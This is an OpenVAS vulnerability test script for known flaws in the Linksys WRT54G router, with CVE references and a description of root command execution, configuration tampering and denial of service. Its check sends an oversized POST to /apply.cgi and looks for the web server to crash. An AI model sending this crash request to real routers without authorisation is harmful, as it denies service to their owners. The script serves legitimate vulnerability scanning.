# OpenVAS Vulnerability Test
# $Id: linksys_multiple_vulns.nasl 9348 2018-04-06 07:01:19Z cfischer $
# Description: Linksys multiple remote vulnerabilities
#
# Authors:
# Josh Zlatin-Amishav (josh at ramat dot cc)
#
# Copyright:
# Copyright (C) 2005 Josh Zlatin-Amishav
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

tag_summary = "The remote router is affected by multiple flaws.

Description :

The remote host appears to be a Linksys WRT54G Wireless Router.

The firmware version installed on the remote host is prone to several 
flaws,

- Execute arbitrary commands on the affected router with root privilages. 

- Download and replace the configuration of affected routers via a special
  POST request to the 'restore.cgi' or 'upgrade.cgi' scripts.

- Allow remote attackers to obtain encrypted configuration information and,
  if the key is known, modify the configuration.

- Degrade the performance of affected devices and cause the Web server 
  to become unresponsive, potentially denying service to legitimate users.";

tag_solution = "Upgrade to firmware version 4.20.7 or later.";

if(description)
{
 script_oid("1.3.6.1.4.1.25623.1.0.20096");
 script_version("$Revision: 9348 $");
 script_tag(name:"last_modification", value:"$Date: 2018-04-06 09:01:19 +0200 (Fri, 06 Apr 2018) $");
 script_tag(name:"creation_date", value:"2006-03-26 17:55:15 +0200 (Sun, 26 Mar 2006)");
 script_bugtraq_id(14822);
 script_cve_id("CVE-2005-2799", "CVE-2005-2914", "CVE-2005-2915", "CVE-2005-2916");
 script_xref(name:"OSVDB", value:"19386");
 script_xref(name:"OSVDB", value:"19387");
 script_xref(name:"OSVDB", value:"19388");
 script_xref(name:"OSVDB", value:"19389");
 script_xref(name:"OSVDB", value:"19390");
 script_tag(name:"cvss_base", value:"7.5");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
 
 name = "Linksys multiple remote vulnerabilities";
 script_name(name);
 
 
 script_category(ACT_DENIAL);
  script_tag(name:"qod_type", value:"remote_vul");
 
 script_copyright("Copyright (C) 2005 Josh Zlatin-Amishav");
 family = "Gain a shell remotely";
 
 script_family(family);
 script_dependencies("gb_get_http_banner.nasl");
 script_mandatory_keys("WRT54G/banner");
 script_require_ports("Services/www",80);
 script_tag(name : "solution" , value : tag_solution);
 script_tag(name : "summary" , value : tag_summary);
 script_xref(name : "URL" , value : "http://www.idefense.com/application/poi/display?id=304&type=vulnerabilities");
 script_xref(name : "URL" , value : "http://www.idefense.com/application/poi/display?id=305&type=vulnerabilities");
 script_xref(name : "URL" , value : "http://www.idefense.com/application/poi/display?id=306&type=vulnerabilities");
 script_xref(name : "URL" , value : "http://www.idefense.com/application/poi/display?id=307&type=vulnerabilities");
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);
if (! get_port_state(port)) exit(0);
if ( http_is_dead(port:port) ) exit(0);

banner = get_http_banner(port:port);
if (banner && 'realm="WRT54G"' >< banner) {
  soc = http_open_socket(port);
  if (! soc) exit(0);

  set_kb_item(name:"Services/www/" + port + "/embedded", value:TRUE);

  len = 11000;	# 10058 should be enough
  req = string("POST ", "/apply.cgi", " HTTP/1.0\r\nContent-Length: ", len,
	"\r\n\r\n", crap(len), "\r\n");
  send(socket:soc, data:req);
  http_close_socket(soc);

  sleep(1);

  if(http_is_dead(port: port))
  {
   security_message(port);
   exit(0);
  }
} 
